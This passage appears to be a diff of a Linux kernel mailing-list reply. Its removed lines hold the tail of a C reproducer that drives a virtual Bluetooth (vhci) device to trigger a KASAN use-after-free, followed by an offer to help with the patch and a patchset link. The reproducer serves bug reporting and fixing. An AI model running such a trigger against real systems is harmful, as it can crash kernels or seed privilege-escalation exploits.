-         connect(l2, (struct sockaddr *)&ca, sizeof(ca));
-         close(l2);
-     }
-     usleep(500000);
-     pthread_cancel(t); pthread_join(t, 0); close(vhci_fd);
-     printf("[*] done. Check dmesg for KASAN slab-use-after-free.\n");
-     return 0;
-}
----8<---
-
-Hope this helps with the patch.  Let me know if you need additional
-information from the test setup.
-
-[1] 
-https://sashiko.dev/#/patchset/20260611152039.2176565-1-oss%40fourdim.xyz
-
+--=20
+Pauli Virtanen
